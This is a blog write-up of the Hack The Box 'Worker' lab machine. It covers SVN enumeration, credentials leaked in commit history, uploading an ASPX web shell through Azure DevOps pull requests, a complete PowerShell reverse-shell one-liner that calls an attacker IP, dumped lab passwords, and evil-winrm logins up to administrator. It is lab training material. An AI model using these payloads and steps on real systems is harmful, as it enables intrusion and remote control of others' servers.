---
title: Hackthebox Worker Writeup
image: /images/worker/info.png
tags:
- hackthebox
- writeup
---

So worker was all about those version control systems. Mainly consisting of svn,git and azure devops server. Sounds intimidating but if you have ever worked with simplest git commands and github then you are ready to solve this one. Anywho... lets start.

<!--more-->

<img src="/images/worker/info.png">

Starting with basic nmap scan. For the record I already did the first scan with `nmap -T4 -Pn -p- 10.10.10.203`. I do this in two steps to first find all open ports and then work on them just for a bit of efficiency.

```
nmap -T4 -A -Pn -p80,3690,5985 10.10.10.203

PORT     STATE SERVICE  VERSION
80/tcp   open  http     Microsoft IIS httpd 10.0
| http-methods: 
|   Supported Methods: OPTIONS TRACE GET HEAD POST
|_  Potentially risky methods: TRACE
|_http-server-header: Microsoft-IIS/10.0
|_http-title: IIS Windows Server
3690/tcp open  svnserve Subversion
5985/tcp open  wsman
Service Info: OS: Windows; CPE: cpe:/o:microsoft:windows
```

Browsing to webpage.

<img src="/images/worker/website.png" width="1000">

Okay... so a windows server. Next I perform basic enumeration and find nothing. Moving on to the svn server. I lookup what it is and find that it is just a version control system and the commands are also quite similar. Lets start enumerating the svn server. [Here is a cheatsheet for that](http://www.cheat-sheets.org/saved-copy/subversion-cheat-sheet-v1.pdf).

First I didn't know jack about enumerating svn so I found some nmap scripts to do that.

```
nmap --script svn-brute --script-args svn-brute.repo=/svn/ -p 3690 worker.htb

Starting Nmap 7.60 ( https://nmap.org ) at 2020-11-02 18:15 IST
Nmap scan report for worker.htb (10.10.10.203)
Host is up (0.23s latency).

PORT     STATE SERVICE
3690/tcp open  svn
| svn-brute:   
|_  Anonymous SVN detected, no authentication needed
```

Okay I don't know that means yet but I think its good. Next I try to list the repositories on the server.

```
svn list svn://worker.htb/
dimension.worker.htb/
moved.txt
```

Lets clone the directory and see the contents of that text file.

```
svn cat svn://worker.htb/moved.txt
This repository has been migrated and will no longer be maintaned here.
You can find the latest version at: http://devops.worker.htb

// The Worker team :)
```

```
svn checkout svn://worker.htb/

A    dimension.worker.htb
A    dimension.worker.htb/LICENSE.txt
A    dimension.worker.htb/README.txt
A    dimension.worker.htb/assets
A    dimension.worker.htb/assets/css
A    dimension.worker.htb/assets/css/fontawesome-all.min.css
A    dimension.worker.htb/assets/css/main.css
A    dimension.worker.htb/assets/css/noscript.css
A    dimension.worker.htb/assets/js
A    dimension.worker.htb/assets/js/breakpoints.min.js
A    dimension.worker.htb/assets/js/browser.min.js
```

We got 2 new subdomains so we add the entry to hosts file. As for the directory named dimension it had some html pages leading to many other subdomains which also had nothing interesting. Pro tip: If you have yet to solve this box copy this line and add it to the hosts file. Thank me later.

`10.10.10.203    worker.htb dimension.worker.htb devops.worker.htb alpha.worker.htb cartoon.worker.htb lens.worker.htb solid-state.worker.htb spectral.worker.htb story.worker.htb twenty.worker.htb`

Browsing to the devops domain.

<img src="/images/worker/devops.png" >

Now we are probably mssing something since we need creds. I head back to the svn repository which I cloned from server. Lets look at the commit history of the repo.

```
svn log

------------------------------------------------------------------------
r5 | nathen | 2020-06-20 19:22:00 +0530 (Sat, 20 Jun 2020) | 1 line

Added note that repo has been migrated
------------------------------------------------------------------------
r4 | nathen | 2020-06-20 19:20:20 +0530 (Sat, 20 Jun 2020) | 1 line

Moving this repo to our new devops server which will handle the deployment for us
------------------------------------------------------------------------
r3 | nathen | 2020-06-20 19:16:19 +0530 (Sat, 20 Jun 2020) | 1 line

-
------------------------------------------------------------------------
r2 | nathen | 2020-06-20 19:15:16 +0530 (Sat, 20 Jun 2020) | 1 line

Added deployment script
------------------------------------------------------------------------
r1 | nathen | 2020-06-20 19:13:43 +0530 (Sat, 20 Jun 2020) | 1 line

First version
------------------------------------------------------------------------
```

We see that there are 5 commit to this repository and the commit number 2 looks interesting. Lets roll back the directory to version number 2.

```
svn info
Path: .
Working Copy Root Path: /home/lol/Downloads/worker/svnworker
URL: svn://worker.htb
Relative URL: ^/
Repository Root: svn://worker.htb
Repository UUID: 2fc74c5a-bc59-0744-a2cd-8b7d1d07c9a1
Revision: 5
Node Kind: directory
Schedule: normal
Last Changed Author: nathen
Last Changed Rev: 5
Last Changed Date: 2020-06-20 19:22:00 +0530 (Sat, 20 Jun 2020)


svn merge -r 5:2 .
--- Reverse-merging r5 through r3 into '.':
A    deploy.ps1
D    moved.txt
--- Recording mergeinfo for reverse merge of r5 through r3 into '.':
 U   .
--- Eliding mergeinfo from '.':
 U   .
```

We now see a script in the directory, lets see its contents.

```
cat deploy.ps1 

$user = "nathen" 
$plain = "wendel98"
$pwd = ($plain | ConvertTo-SecureString)
$Credential = New-Object System.Management.Automation.PSCredential $user, $pwd
$args = "Copy-Site.ps1"
Start-Process powershell.exe -Credential $Credential -ArgumentList ("-file $args")
```

We now have a set of creds. Try that on the devops domain.

<img src="/images/worker/nathen.png" >

I take at look at what azure devops is and it is a just a development environment. Lets look at the repositories. 

<img src="/images/worker/repos.png" width="1000">

Hmm...I saw all these names when I was browsing the websites before. We see the source code for all the pages. I go through all of them and finally found... Yep you guessed it... nothing. I found nothing. Moving on an imaginary light bulb lit up above my head. If I can see the source and I know its a windows server. Lets create a mailicious .aspx file and upload it.

First I try a reverse shell aspx file made with msfvenom. Here are the steps to upload the file:

1. Create a new branch on any of the sub-domains(I used alpa) and name it anything (literally if you want to). Remember to link it to a work item. Just pick something from suggestions.
2. Upload the file to this branch. 
3. Create a pull request.
4. Approve the request and click on complete. 

When you browse to the shell file  like `http://alpha.worker.htb/shell.aspx` and setup a netcat listener you shouldn't get a shell. lol. I say this because I tried multiple shells and then the one which finally worked was [this one](https://github.com/xl7dev/WebShell/blob/master/Aspx/ASPX%20Shell.aspx). 

Though it is not a direct shell. It looks like this after you upload it.

<img src="/images/worker/aspxshell.png" width="1000">

After that you need to enter the command for a reverse shell.

```
powershell -nop -exec bypass -c "$client = New-Object System.Net.Sockets.TCPClient('10.10.14.10',1234);$stream = $client.GetStream();[byte[]]$bytes = 0..65535|%{0};while(($i = $stream.Read($bytes, 0, $bytes.Length)) -ne 0){;$data = (New-Object -TypeName System.Text.ASCIIEncoding).GetString($bytes,0, $i);$sendback = (iex $data 2>&1 | Out-String );$sendback2 = $sendback + 'PS ' + (pwd).Path + '> ';$sendbyte = ([text.encoding]::ASCII).GetBytes($sendback2);$stream.Write($sendbyte,0,$sendbyte.Length);$stream.Flush()};$client.Close()"
```

What does this command mean? I have no idea. Tell me too if you find anything. All I know is I got a shell now.

```
nc -lvp 1234
Listening on [0.0.0.0] (family 0, port 1234)
Connection from worker.htb 50047 received!
whoami
iis apppool\defaultapppool
PS W:\sites\alpha.worker.htb> 
```

I start looking around for some juice and I did find some very juicy stuff; A full list of usernames and passwords to be exact inside the `W:\svnrepos\www\conf\passwd` file.

```
PS W:\svnrepos\www\conf> cat passwd
### This file is an example password file for svnserve.
### Its format is similar to that of svnserve.conf. As shown in the
### example below it contains one section labelled [users].
### The name and password for each user follow, one account per line.

[users]
nathen = wendel98
nichin = fqerfqerf
nichin = asifhiefh
noahip = player
nuahip = wkjdnw
oakhol = bxwdjhcue
owehol = supersecret
paihol = painfulcode
parhol = gitcommit
pathop = iliketomoveit
pauhor = nowayjose
payhos = icanjive
perhou = elvisisalive
peyhou = ineedvacation
phihou = pokemon
quehub = pickme
quihud = kindasecure
rachul = guesswho
raehun = idontknow
ramhun = thisis
ranhut = getting
rebhyd = rediculous
reeinc = iagree
reeing = tosomepoint
reiing = isthisenough
renipr = dummy
rhiire = users
riairv = canyou
ricisa = seewhich
robish = onesare
robisl = wolves11
robive = andwhich
ronkay = onesare
rubkei = the
rupkel = sheeps
ryakel = imtired
sabken = drjones
samken = aqua
sapket = hamburger
sarkil = friday
```

One of them caught my eye. robisl:wolves11 because robisl is a user as I found out from the Users directory. Trying these cred with evil-winrm we get a shell as robisl.

```
evil-winrm -u robisl -p wolves11 -i 10.10.10.203

Evil-WinRM shell v2.3

Info: Establishing connection to remote endpoint

*Evil-WinRM* PS C:\Users\robisl\Documents>
```

Find the user flag in Desktop. 

So the next step is to fall inside a rabbit hole so big that you might just start calling it a big rabbit hole (I write as I laugh like a total idiot). I'm not joking though. I ran winpeas,powerup and enumerated the hell out of the box and couldn't find anything. 

Decided to take a step back and tried the rob creds on the devops domain again. We did it bois, rabbit hole is no more. We see another repo. 

<img src="/images/worker/robisl.png" width="1000">

I see a bunch of files and start skimming over the contents. We have an easy root just sitting there like a duck waiting to be shot by .50 BMG armour penetrating rounds (that may have been a bit overkill, only a bit though). 

<img src="/images/worker/pipeline.png">

Try these creds with evil-winrm again and we have a root.

```
evil-winrm -u administrator -p Pirates32! -i 10.10.10.203

Evil-WinRM shell v2.3

Info: Establishing connection to remote endpoint

*Evil-WinRM* PS C:\Users\Administrator\Documents> whoami
worker\administrator
```